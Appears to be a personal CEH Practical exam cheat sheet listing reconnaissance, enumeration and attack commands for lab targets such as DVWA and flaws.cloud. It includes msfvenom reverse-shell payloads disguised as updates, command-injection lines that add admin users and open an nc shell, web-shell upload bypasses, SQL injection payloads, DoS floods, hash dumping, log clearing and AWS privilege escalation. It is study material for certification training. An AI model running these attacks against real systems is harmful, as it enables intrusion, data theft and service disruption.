# CEH-Practical-Notes
![Key Generation](CEH-Practical-Logo.png)

## Footprinting 02
 
Footprinting with Social Websites

	theHarvester -d eccouncil -l 200 -b linkedin
	sherlock "satya nadella"

    BillCipher

	1. DNS Lookup
	2. Whois Lookup
	3. GeoIP Lookup (I)
	4. Subnet Lookup
	6. Page Links
	7. Zone Transfer
	8. HTTP Header.....-> 22.

    Whois Lookup

	https://whois.domaintools.com/
	https://www.whois.com/whois/

    DNS Lookup
	
	https://centralops.net/co/
	https://mxtoolbox.com/DNSLookup.aspx  
	http://www.kloth.net/services/nslookup.php
	dnsrecon.py

    # Reverse IP Domain Checker
	https://www.yougetsignal.com

    Find Network Range, CIDR

	https://www.arin.net/about/welcome/region/

    IP Geolocation
  
	https://www.lookip.net/ (reverse DNS also)
	billcipher.py

    Passive Enumeration (Open Ports, Operating System)
 
	https://www.shodan.io/
	https://search.censys.io/
	
    # Video Search Engine
	https://mattw.io/youtube-metadata/

    # FTP Search Engine
	https://www.searchftps.net/ 

    # Digital Certificates
	https://crt.sh/
	censys
	

## Scanning Network 03
	Nmap Port Scan
	Angry IP Scanner.exe (discovering live hosts)
	Service Version Check with Metasploit (like smb_version)
	
	
	
## Enumeration 04
	
    # Passive Enumeration 
	https://www.shodan.io/	(Port:1883, SCADA)
	https://search.censys.io/
	
    # Netbios Enumeration 
	nbtstat -a <ip> (cmd)
	nbtstat -c 
	net use

	NetBIOS Enumerator.exe
	
	nmap -sV --script nbstat <ip> -v
	nmap -sU -p 137 --script nbstat <ip>
	

    # SNMP Enumeration 

	nmap -sU -p 161 <ip> (because it will not show on normal nmap scan)	

	snmp-check <ip>
	nmap -sU -p 161 --script snmp-processes <ip>
	nmap -sU -p 161 --script=snmp-sysdescr <ip> 
	nmap -sU -p 161 --script snmp-win32-software <ip> 
	nmap -sU -p 161 --script snmp-interfaces <ip>
	
	msfconsole 
		> search snmp
		> use auxiliary/scanner/snmp/snmp_login
		> show options
		> set RHOSTS <ip>
		> exploit
		

    # LDAP Enumeration 
	AD Explorer.exe

	nmap -p 389 --script ldap-rootdse.nse <IP>
	nmap -p 389 --script ldap-brute.nse --script-args ldap.base='"cn=users,dc=XYZ,dc=com"' <IP>
	nmap -p 389 --script ldap-search.nse <IP>
	
	ldapsearch -h <IP> -x -s base namingcontexts
	ldapsearch -h <IP> -x -b "DC=XYZ,DC=com"
	ldapsearch -h <IP> -x -b "DC=XYZ,DC=com" "objectClass=*"
	ldapsearch -h <IP> -x -b "DC=XYZ,DC=com" "objectClass=user" | grep "dn:"
	or
	ldapsearch -x -h <ip> -b "DC=XYZ,DC=com" "objectClass=user" enm
    

    # NFS Enumeration 
	nmap -sV --script nfs-ls,nfs-showmount,nfs-statfs <IP> -v

	showmount -e <IP>
	rpcinfo -p <IP> | grep "nfs"
	

    # DNS Enumeration 
	Zone Transfer
		dig ns <domain>
		dig axfr <domain> @<name-server>

	Find Responsible Mail Address (cmd)
		nslookup
		> set querytype=soa	(start of authority)
		> certifiedhacker.com


	dnsrecon		
		dnsrecon.py -d www.certifiedhacker.com -z
		dnsrecon.py -d zonetransfer.me -t axfr		 (Zone transfer Successfull !!)

	dnsenum
		dnsenum zonetransfer.me

	fierce
		fierce --domain zonetransfer.me

	nmap
		nmap --script=broadcast-dns-service-discovery <domain.com>
		nmap -p 53 --script dns-brute <domain.com>
		nmap -p 53 --script dns-srv-enum  <domain.com>	//rDNS
		

    # SMTP Enumeration 
	nmap -p 25 --script smtp-enum-users <ip>
	nmap -p 25 --script=smtp-open-relay <ip>
	nmap -p 25 --script=smtp-commands <ip>
	smtp_version	(metasploit)
	smtp_enum	(metasploit)
    
    # SMB Enumeration
	smbclient -L <ip>
	nmap -p 445 --script smb-os-discovery <ip>
	nmap -p 445 --script smb-enum-shares <ip> -v
	nmap -p 445 --script smb-enum-users <ip> -v
	nmap -p 445 --script smb-enum-users --script-args smbusername="administrator",smbpassword="smbserver_711" <ip>
	
	enum4linux -a <ip>
	enum4linux -a -u username -p password <ip>

	smbclient //<ip>/<share> -U username -p <port>
	

    # RPC, SMB, FTP Enumeration
	nmap -A <ip> -v

	enum4linux -a -u username -p password <ip>	(platform_id,rid,server_type etc)
	
    # SQL Enumeration
	mysql -h <ip> -u <username -p <password> (--ssl=FALSE)
	Metasploit
		auxiliary/admin/mysql/mysql_sql
		auxiliary/scanner/mysql/mysql_schemadump
		auxiliary/scanner/mysql/mysql_hashdump

    Subdomain Enumeration

	gobuster vhost -u https://futurevera.thm/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -k --append-domain
	ffuf -u https://foolera.thm/FUZZ -w wordlist.txt	//it is finding directories not subdomains
	subfinder -d google.com
	https://sitereport.netcraft.com
	https://subdomainfinder.c99.nl/

Directory Busting

	gobuster dir -u https://google.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


## Vulnerability Analysis 05
    # Nmap Script Engine
	nmap --script vuln <ip> -v

    # CWE, CVE and NVD
	https://cwe.mitre.org
	https://cve.mitre.org
	https://nvd.nist.gov
	
	Google Search "nvd severity score range"

    # Tools
	OpenVAS
	Nessus		(Default port: 8834)
	Nikto

	nikto -h https://www.certifiedhacker.com
	nikto -h https://www.certifiedhacker.com -Tuning x
	nikto -h https://www.certifiedhacker.com -Cgidirs all


## System Hacking 06

    # Gaining Access
	responder -I eth0
	john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

	l0phtCrack 7 (Win64)	//Securiy auditing.
	Exploit-DB
	
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4477 --platform windows -f exe -o Security_Update.exe
		
    # Privilege Escalation Windows
	meterpreter > run post/windows/gather/smart_hashdump	
	meterpreter > getsystem -t 1
	meterpreter > background
	Backgrounding session 1...
	
	msf6 > search bypassuac
	msf6 > use exploit/windows/local/bypassuac_fodhelper
	msf6 exploit(windows/local/bypassuac_fodhelper) > set SESSION 1
	msf6 exploit(windows/local/bypassuac_fodhelper) > set LHOST 10.10.1.13
	msf6 exploit(windows/local/bypassuac_fodhelper) > set TARGET 0
	msf6 exploit(windows/local/bypassuac_fodhelper) > exploit
	meterpreter > getuid
	meterpreter > getsystem -t 1
	meterpreter > getuid		//now we are administrator (nt authority)

	meterpreter > hashdump
	meterpreter > run post/windows/gather/hashdump
	meterpreter > run post/windows/gather/smart_hashdump

	meterpreter > run post/windows/manage/sticky_keys

	meterpreter > clearev		// at the end
		
	
	meterpreter > load kiwi
	meterpreter > help kiwi
	meterpreter > lsa_dump_sam
	meterpreter > password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password

	meterpreter > ps
	meterpreter > migrate 4535 (pid acquired in ps like 4535 explorer.exe)
	
    # Maintain access with Startup
	meterpreter > cd “C:\\ProgramData\\Start Menu\\Programs\\Startup”
	meterpreter > pwd
	msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=8080 -f exe > startup.exe
	
	upload /home/attacker/payload.exe	(in "Startup" folder)
	

## Malware Threats 07

    # Malware Creation
	nmap -p- <ip> -v
	
	njRAT		(Default port: 5552)
	TheefRAT	(Default port: 6703, ftp 2968)
	HTTP RAt	(Default port: 80)
	Mosucker
	ProRAT		(Default port: 5110)

	JPS Virus Maker
	virus.total.com

    # Static Malware Analysis
	https://www.hybrid-analysis.com
	BinText	(search string - file pos, memory pos)

	PEiD	(entrypoint, file offset, subsystem, linker info, .text etc...)

	DIE  [elf,exe]	(operating system, compiler,  architecture, mode, file name, size, entropy, entrypoint, operation window, pe header, pt_load, strings search, sha1, md5 etc ....)

	PE Explorer (machine, linker version, address of entry point, time date stamp, resource table, import address table, import table, .text, .rdata [section headers] etc......)

	Dependency walker (KERNEL32.DLL, ADVAPI32.DLL, WS2_32.DLL, MPR.DLL)

	IDA (Click text View on Right Click)
		Copy  to C:\Program Files\IDA Freeware 7.7
		View -> Graph -> Flow Chart
		View -> Graph -> Function Calls
		
		Hex-view, Structures, Enums etc..

	OllyDbg 
		View -> Log Data, Executable modules, Memory, Threads

	Ghidra
		Import file -> (Double click executable) -> Analyze
			(Important is Import Result Summary)	//this will popup immediately after importing file.
			
    # Dynamic Malware Analysis
	# Port Monitoring
		TCPView		(Port monitoring)
		CurrPorts	(Port monitoring)
			left click on a process -> Properties

	# Process Monitoring
		procmon.exe -> right click on any process -> Propertires -> Event | Process | Stack
	# Registry Monitoring
		reg organiser.exe -> Tools -> Registry Snapshots
	# Windows Services Monitoring
		srvman.exe
			Service -> Properties
			Service -> Start | Stop | Restart
	# Windows Startup Program Monitoring
		autorun.exe
			Everything | Logon | Explorer | Services | Drivers | Known DLLs | etc..
		winpatrol.exe	
			IE Helpers | Services | File Types | Active Tasks | etc..
	# Installation Monitoring
		mirekusoft install monitor
	# Files and Folder Monitoring (can be local host and remote)

	# Device Driver Monitoring
		DriverView.exe	(Driver name, address, end address, size, index, file type, version etc...)
			Right Click -> Properties
		Driver reviver (helps to update drivers)
			OUTDATES or UP TO DATE	(Double click on "up to date" to see "version, date, provider")
	# DNS Monitoring
		dnsquerysniffer.exe
			Properties

## Sniffing 08
    # Mac Flooding
	macof  -i eth0 -n 10
    # DHCP Starvation Attack
	yersinia -I/yersinia -G
    # Arp spoofing
	arpspoof
    # Mitm using Cain
    # Mac Spoofing using TMAC and SMAC
    # macchanger

	http.request.method == POST
	
	
## Social Engineering 09

	setoolkit (Credential Harvester)

	https://phistank.org
	netcraft extension (site report)


## Denial of Service 10
    # SYN Flood
	nmap -p 21 <ip>
	msfconsole -q
		msf6 > search synflood
		msf6 > use 0
		msf6 auxiliary(dos/tcp/synflood) > set rhost <target-IP>
		msf6 auxiliary(dos/tcp/synflood) > set rport 21
		msf6 auxiliary(dos/tcp/synflood) > set shost <spoofable-IP>
    # Dos Using hping3
	hping3 -S (Target IP Address) -a (Spoofable IP Address) -p 22 --flood 
	hping3 -d 65538 -S -p 21 --flood (Target IP Address)
	hping3 -2 -p 139 --flood (Target IP Address)	//-2 means UDP mode

    # Dos attack using Raven-Storm
	sudo rst
		>> l4
		>> ip <target-ip>
		>> port 80
		>> threads 20000
		>> run
    # Perform a DDoS Attack using HOIC and LOIC
	hoic.exe
		http://<target-ip>
		High
		GenericBoost.hoic
		Thread 20
		(Set this and run ddos in multiple machines)

	loic.exe
		set target ip and lock on
		method UDP
		Threads 10
		and move the slidebar to the middle (speed)

    # Detect DoS and DDoS
	Anti_DDos_Guardian.exe
		Click on the machine with highest packets and click on Block IP to stop dos attack

## Session Hijacking 11

    # Hijack a session using OwaspZAP

    # Intercept HTTP traffic using bettercap
		bettercap -iface eth0
			>> net.probe on
			>> net.show
			>> set http.proxy.sslstrip true
			>> set arp.spoof.internal true 
			>> set arp.spoof.targets 10.10.1.11 
			>> http.proxy on
			>> arp.spoof on
			>> net.sniff on
			>> set net.sniff.regexp ‘.*password=.+’ 

    # Intercept HTTP traffic using Hetty
		hetty.exe
			go to http://localhost:8080 (to open hetty)
			click manage project -> create new project -> click on proxy logs
			in target machine set proxy with the ip address of my machine with port 8080 -> perform an action (login to a website)
			then go to proxy logs and observe the captured requests

## Evading IDS, Firewall 12
	
## Web Server Hacking 13

    # Footprint the web server

	python3 ghosteye.py 
		Enter your choice: 2	//for example
		Enter domain/IP : domain.com
	
	Skipfish
		skipfish -o /home/attacker/test -S /usr/share/skipfish/dictionaries/complete.wl http://<ip>:<port> 

	httprecon (Windows)
		//provides server, version, protocol version, etc..

    # Banner Grabbing
	nc -vv www.domain.com 80
	(Type "GET / HTTP.1.0" and press enter twice)

	telnet www.domain.com 80
        (Type "GET / HTTP.1.0" and press enter twice)

	curl -I www.domain.com

    # Enumeration
	nmap -sV --script http-enum www.domain.com -v
	nmap -sV --script http-trace -d www.domain.com
	nmap -p 80 --script http-waf-detect www.domain.com

	whatweb https://www.certifiedhacker.com

	uniscan -u http://10.10.1.22:8080/CEH -q 
	uniscan -u http://10.10.1.22:8080/CEH -we		//version, etc...
	uniscan -u http://10.10.1.22:8080/CEH -d		//emails, etc...
	
    Extras:--
	billcipher

	nikto -h <url>


    # FTP Bruteforcing with HYDRA
	nmap -p 21 <ip> -v
	hydra -L Users.txt -P Passwords.txt ftp://<ip>
    

## Web Application Hacking 14
    # Footprinting Web Insfrastructure
	nmap -T4 -A -v www.domain.com 
	telnet www.domain.com 80
		(Type GET / HTTP/1.0 and press enter twice)
	

	whatweb www.domain.com
	whatweb -v www.domain.com

    # OwaspZAP
		Automated Scan http://www.domain.com
			Spider | Active Scan | Alerts
	
    # Load Balancers
		dig yahoo.com
		lbd yahoo.com

    # Directory Busting
		nmap -sV --script=http-enum www.domain.com

		gobuster dir -u http://www.domain.com -w common.txt
		gobuster dir -u http://www.domain.com -w common.txt -x .php,.aspx

		python3 dirsearch.py -u http://www.moviescope.com
		python3 dirsearch.py -u http://www.moviescope.com -e aspx
		python3 dirsearch.py -u http://www.moviescope.com -x 403 //exclude 403 status code.

	Vega (Windows)	//vulnerability scanning

    # Clickjacproc
		echo "http://www.domain.com" > domain.txt
                python3 clickjackproc.py -f domain.txt
	or
		ghosteye (use 6 for clickjacking)

    # Bruteforce attack with Burpsuite

		use intruder to bruteforce (cluster bomb)
	or
		wpscan --url http://www.domain.com:8080/CEH -U usernames.txt -P passwords.txt

    # Parameter Tempering 
		Using Burpsuite

    # PwnXSS
		python3 pwnxss.py -u http://testphp.vulnweb.com

    # Parameter Tampering and XSS in browser (manual)
		?id=1, ?id=2, index.php?page_id=3

    # CSRF 

    # WordPress (Enum vulnerable plugin and users)
	Get Api token from https://wpscan.com/register/ 

		wpscan --api-token "" --url http://<ip>:<port>/CEH --plugin-detection aggressive --enumerate vp

	Wpscan and Metasploit

		wpscan --api-token "" --url http://<ip>:<port>/CEH --enumerate u	(enumerate users)

		msfconsole -q
			msf6 > search wordpress_login
			msf6 > use 0
			msf6 auxiliary(scanner/http/wordpress_login_enum) > set rhosts 10.10.1.22
			msf6 auxiliary(scanner/http/wordpress_login_enum) > set rport 8080
			msf6 auxiliary(scanner/http/wordpress_login_enum) > set targeturi http://10.10.1.22:8080/CEH
			msf6 auxiliary(scanner/http/wordpress_login_enum) > set pass_file passwords.txt
			msf6 auxiliary(scanner/http/wordpress_login_enum) > set username admin
			msf6 auxiliary(scanner/http/wordpress_login_enum) > run
		
		wpscan --api-token "" --url "" --enumerate p	(enumerate plugins)
		wpscan --api-token "" --url "" --enumerate t	(enumerate themes)
		    
    # Command Injection	
	Set security to 'low'
	
	| ls (low)
	| ls (medium)
	|ls  (high)

	| hostname
	| whoami
	| tasklist
	| taskkill /PID 3112 /F
	| dir C:\
	| type C:\flag.txt

	| net user
	| net user Test /Add
	| net user
	| net localgroup administrators Test /Add
	| net user
	
	127.0.0.1 && nc -c sh <ip> 4477
	//net user test active:yes

	(now connect to test user with RDP)

    # File Upload
	Low
		msfvenom -p php/meterpreter/reverse_tcp LHOST=<my-ip> LPORT=4477 -f raw > low.php
	
	Medium 
		msfvenom -p php/meterpreter/reverse_tcp LHOST=<my-ip> LPORT=4477 -f raw > medium.php
		mv medium.php medium.php.jpg
	
		Intercept the upload request with burpsuite and change to extension from ".php.jpg" to ".php"

		OR

		simply upload medium.php -> intercept request -> change the header from [Content-Type: application/x-php] to  [Content-Type: image/jpeg]

	High	
		msfvenom -p php/meterpreter/reverse_tcp LHOST=<my-ip> LPORT=4477 -f raw > image.jpg

		Add "GIF98" \n	in the starting of image.jpg
		upload on dvwa

		|dir "C:\wamp64\www\DVWA\hackable\uploads"
		|copy "C:\wamp64\www\DVWA\hackable\uploads\image.jpg" "C:\wamp64\www\DVWA\hackable\uploads\high.php"

		open exploit/multi/handler/ meterpreter and
		run the file in browser	http://10.10.1.22:8080/dvwa/hackable/uploads/high.php

    # Log4shell

        pip3 install -r requirements.txt
        replace /jdk.... with the original one with absolute path /home/attacker/jdk...
        nc -lvnp 7777
        python3 poc.py --userip <myip> --webport 8080 --lport 7777
        
    # Extras:--	

    # Identify CMS (Content Management System)
	wig <url>

    # WordPress Hacking
	wordpress
	
	wpscan --url http://certifiedhacker.com -U usernames.txt -P passwords.txt
	wpscan --api-token "" --url http://<ip>:<port>/CEH --plugin-detection aggressive --enumerate vp
	wpscan --api-token "" --url http://<ip>:<port>/CEH --enumerate u
	


## SQL Injection 15

    # Manual SQLi

	admin' or 1=1--
	admin'; insert into login values('test','hacker123'); --
	admin'; create database pagalworld; --
	admin'; drop database pagalworld; --
	a'; exec master..xp_cmdshell 'ping www.certifiedhacker.com -t -l 65000'; --

    # SQLmap
	sqlmap --url <vulernerable-url> --cookie "" --dbs
	sqlmap --url <vulernerable-url> --cookie "" -D "database" --tables
	sqlmap --url <vulernerable-url> --cookie "" --D "database" -T "table_name" --dump
	sqlmap --url <vulernerable-url> --cookie "" --D "database" -T "table_name" --dump-all
	sqlmap --url <vulernerable-url> --cookie "" --D "database" -T "table_name" --os-shell
	sqlmap --url <vulernerable-url> --cookie "" --D "database" -T "table_name" --os-pwn

	sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 --dbs
	sqlmap --url http://10.10.95.177/blood/blood.php --cookie="" --crawl=3 --level=5 --risk=3 --dbs
	
	POST-REQUEST
		sqlmap -r req.txt -p blood_group --dbs	(-p is testable parameter for the post request)

	GET-REQUEST
		sqlmap -u https://testsite.com/page.php?id=7 --dbs

    # DSSS
	python3 dsss.py -u "http://www.target.com/page.php?id=1" --cookie=""

    # OwaspZAP (detect SQLi)
	Automated Scan -> Go to "Alerts" -> SQL Injection


## Wireless Hacking 16

	aircrack-ng WEPcrack-01.cap
 	aircrack-ng WPA.cap -w wordlist.txt
	aircrack-ng -a 2 -b <bssid> WPA2crack-01.cap -w wordlist.txt
	
## Hacking Mobile Platforms 17

	msfvenom -p android/meterpreter/reverse_tcp lhost=<ip> lport=4477 -o update.apk

	setoolkit	(credential harvester)

	dos attack with LOIC
		http://<ip> -> GET IP -> TCP -> port 80 -> threads 100
	
	PhoneSploit	(0 to clear, b previous page, p next page)
		0 = Clear Screen
		p = Next Page
		b = Back to previous page
		4 = Access shell on phone
		9 = Pull File and folder from phone to pc
		7 = Screenshot
		14 = list all apps on phone
		15 = run an app
		18 = Show Mac/Inet
		21 = Netstat
		24 = Use Keycode

	AndoRAT
		python3 androRAT.py --build -i <ip> -p <port> -o security.apk
		python3 androRAT.py --shell -i 0.0.0.0 -p <port>
		
		Interpreter > help
		Interpreter > deviceInfo
		Interpreter > getSMS inbox
		Interpreter > shell
		Interpreter > getIP
		Interpreter > getMACAddress

	sisik.eu
		https://sisik.eu

	MalwareBytes


## IoT and OT Hacking 18
    # Footprinting
	https://www.whois.com/whois/
		www.oasis-open.org

	https://www.exploit-db.com/
		Type SCADA and search
		
	https://www.google.com
		"login" intitle:"scada-login"

	https://account.shodan.io/login
		After login -> port:1883 (to search ip addresses with MQTT enabled.)

    # Capture and Analyze IoT Device Traffic
	Bevywise_MQTTRoute_Win_64.exe
	
	Wireshark Filters
		mqtt
		mqtt.msgtype == 3


## Cloud Computing 19

    # Enumerate S3 Buckets
	lazys3
		ruby lazys3.rb
		ruby lazys3.rb HackerOne
		ruby lazys3.rb flaws.cloud

	S3Scanner
		cat sites.txt
		flaws.cloud
		reddit.com
		etc...
	
		python3 s3scanner.py sites.txt
	#Udemy
	cloud_enum
		cloud_enum -k certifiedhacker --disable-azure --disable-gcp

	S3BucketList v2.1 (chrome extension)
		https://github.com/AlecBlance/S3BucketList


    # Exploit S3 Buckets
	pip3 install awscli
	aws configure	(ask for key)
		https://console.aws.amazon.com (need aws account)
		Sign in with root user -> Security Credentials -> Create Access keys
	Paste the Access Key ID:
	Paste the Secret Access key:
	
	aws s3 ls s3://certifiedhacker02

	https://certifiedhacker02.s3.amazonaws.com/
 	http://flaws.cloud.s3.amazonaws.com/

	echo “You have been hacked” >> Hack.txt
	aws s3 mv Hack.txt s3://certifiedhacker02

	https://certifiedhacker02.s3.amazonaws.com/

	aws s3 rm s3://certifiedhacker02/Hack.txt


	#Udemy
	aws s3 ls s3://flaws.cloud/ --no-sign-request
	aws s3 cp s3://flaws.cloud/secret.html . --no-sign-request
	aws s3 cp ./index.html s3://flaws.cloud --no-sign-request

	aws configure --profile aman
	aws s3 ls s3://flaws.cloud/ --profile aman
	aws s3 --profile aman cp s3://flaws.cloud/file.txt .

	Tip : [search flaws challenge in google and read the medium writeup]
	

    # Perform Privilege Escalation to Gain Higher Privileges

	aws configure
	vim user-policy.json
	
		"Version":"2012-10-17",

		"Statement": [
			{

			"Effect":"Allow",

			"Action":"*",

			"Resource":"*"

			}
		]
	
	
	:wq!
	

	aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json 
	aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy
	aws iam list-attached-user-policies --user-name [Target Username]
	aws iam list-users 
	
    	# Extra
		List of S3 buckets: aws s3api list-buckets --query "Buckets[].Name"

		User Policies: aws iam list-user-policies

		Role Policies: aws iam list-role-policies

		Group policies: aws iam list-group-policies

		Create user: aws iam create-user

	
## Cryptography 20

    # Encrypt the Information using Various Cryptography Tools
	
	HashCalc
	MD5 Calculator
	HashMyFiles	(Calculate bulk hashes)
	Extra:
		https://hash-file.online
	

	CryptoForge			(.cfe)
	CryptoForge Text		(.cfd)
	BCTextEncoder			(.txt)
	Advance Encryption Package	(.aes or .aep)
	
    # Create a Self-signed Certificate
	Go to https://www.goodshopping.com
		This site can't be reached

	Internet Information Services (IIS) Manager -> Server Certificates -> Create Self-Signed Certificate -> Give a name for ex-GoodShopping
	Sites -> GoodShopping -> Bindings... -> Add -> Type = https, IP address = <IP>, Port = 443, Host name = www.goodshopping, SSL certificate -> OK -> Close
	Right click on name of site and refresh

	Go to https://www.goodshopping.com
		Your connection is not private

    # Email Encryption using RMail
	rmail.com -> Apps -> RMail Online -> Click here to Get Started -> Create an Account
	Login -> Applied options = Marked as a Registered Email, Check Encrypt Box, Transmission, Check E-Sign, Web Sign
	Write a message, write To: email -> SEND REGISTERED

	Receiver side : 
		Open email -> View & Sign Document -> CONTINUE -> After viewing message -> NEXT -> Hacker Prasad

	Sender side:
		open email -> There will be written Signed by Hacker Prasad.

    # Disk Encryption
	
	Veracrypt
	Bitlocker
	Rohos Disk Encryption	(.rdi)

    # Cryptanalysis Tools

	Cryptool		(.hex)
		Encrypt/Decrypt -> RC2 -> 05 -> Encrypt and Vice-versa.	= (Cry-RC2-Unnamed1.hex)
		Encrypt/Decrypt -> Triple DES(ECB) -> 00 00 .. -> 12 12 .. -> Encrypt and vice-versa. = (Cry-Triple-Unnamed1.hex)
		
		crypt-128-06-encr.hex = Decrypt/Encrypt -> Further Algorithms -> Twofish -> Key length[128 bits] -> 00 00 .. -> 06 06 .. -> Decrypt.
		
	AlphaPeeler		
		Professinal Crypto -> DES Crypto -> Encrypt [ DES-EDE (CDE) ]			(output will be long hexa-decimal string.)
	
    # Crack hash online
	crackstation.net
	hashes.com
	cyberchef
	base64decode.org
	md5hashing.net	
	www.dcode.fr/caesar-cipher

## Important Stuff :
		
Steganography

   # NTFS Streams
	type calc.exe > file.txt:calc.exe
	dir /r
	mklink backdoor.exe file.txt:calc.exe

   # OpenStego	(.bmp)

   # StegOnline (.png, .jpg)
	https://georgeom.net/StegOnline/upload (5 5 5 followed by RGB)
	
   # Steghide : (.jpg)
	steghide --embed -ef secret.txt -cf image.jpg -p "hacker@123"
	steghide --extract -sf image.jpg -p "hacker@123"

   # Stegcracker:
	stegcracker image.jpg /usr/share/wordlists/rockyou.txt
	
   # Stegseek (Crack Steghide):
	stegseek --crack image.jpg -wl /usr/share/wordlists/rockyou.txt --verbose

   # SNOW.EXE / Stegsnow :
     --EMBED
	
	# Message taken with "-m"
	stegsnow -C -m "Bruce Wayne is Batman" -p "hacker@123" note.txt hidden-note.txt
	
	# Message taken from file.
	stegnow -C -f message.txt -p "hacker@123" note.txt hidden-note.txt
	
     --EXTRACT
	# Message will be standard output.
	stegsnow -C -p "hacker@123" hidden-note.txt

	# Message will save to a file.
	stegsnow -C -p "hacker@123" hidden-note.txt revealed.txt
	
	

ADB (Android Debugging Bridge)

	adb version
	adb devices
	adb devices -l
	
	# Open a port on mobile device
	adb tcpip 5555

	# Connect to a mobile over tcpip
	adb connect <IP>:<PORT>

	adb shell

	# Download file from phone
	adb pull <source> <destination>

	# Upload file to phone
	adb push <source> <destination>

	# Online APK analysis
	sisik.eu	(manifest, permissions, etc..)


Hydra
	
	hydra -l user -p password <IP> ftp
	hydra -L users.txt -P passwords.txt <IP> smb
	ncrack --user user -P wordlist.txt ssh://10.10.91.125:22 -v
 	ncrack -U username.txt -P password.txt smb://10.10.10.10 -v

	ssh -oHostKeyAlgorithms=+ssh-rsa user@10.10.91.125
	hydra -l admin -P /usr/share/wordlists/rockyou.txt brute.thm http-post-form '/admin/:user=^USER^&pass=^PASS^:Username or password invalid'
	evil-winrm -i 10.129.181.85 -u "Administrator" -H "0118e05f0e12da4526947612faadc508"
	evil-winrm -i 10.129.181.85 -u "Administrator" -p "badminton"

Privilege Escalation Linux

    # Horizontal PrivEsc
	sudo -u user2 /bin/bash
	ssh		cat /home/user/.ssh/id_rsa

    # Vertical PrivEsc
	sudo -i
	sudo		sudo -l
	suid		find / -perm -4000 2> /dev/null (SUID)
	ssh		cat /root/.ssh/id_rsa
	permission	ls -lah /etc/shadow /etc/passwd
	nfs
	cronjob	(overwrite.sh)
		write permission
		path variable
		Wildcard (tar *)
	capabilities	getcap -r / 2> /dev/null
	

    # Scripts
	linpeas.sh or winpeas.exe			
	linux-exploit-suggester.sh	
	windows-exploit-suggester.exe
	
Wireshark (Packet Sniffing)

    # Capture File Info
	Statistics -> Capture File Properties
	
    # Filtering Packets
	ip.addr == <IP>
	http
	tcp
	!tcp
	tcp.port == 9999
	tcp.dstport == 9999
	http.request.method == "POST"

    # Follow Up Streams
	Right Click on Packet -> Follow -> TCP/HTTP Streams

	(Change the stream number to see entire communication)
	
    # Finding Files 
	File -> Export Objects

    # Finding Comments
	Statistics -> Capture File Properties

    # Search Strings (Packet Details)
	Ctrl + F

    # DDos Attack & DDoS Attack
	Statistics -> Conversations

    # IoT
	mqtt
	mqtt.msgtype == 3	(Publish Message)

    # 3 Way Handshake

	SYN :	  tcp.flags.syn == 1 && tcp.flags.ack == 0
	SYN-ACK:  tcp.flags.syn == 1 && tcp.flags.ack == 1
	ACK:	  tcp.flags.syn == 0 && tcp.flags.ack == 1


RDP

    # Confirm RDP is running or not?
	msfconsole -q
		> search rdp_scanner
		> use auxiliary/scanner/rdp/rdp_scanner
		> show options
		> set RHOSTS <ip>
		> set RPORT <port>
		> exploit

    # Exploiting RDP
	hydra -L users.txt -P passwords.txt rdp://<ip>
	
    # RDP Login
	xfreerdp /v:<ip>:<port> /u:user /p:password /cert:ignore
	xfreerdp /v:<ip> /u:user /p:password /cert:ignore /workarea /smart-sizing
	remmina -c rdp://user:password@<ip> --enable-fullscreen

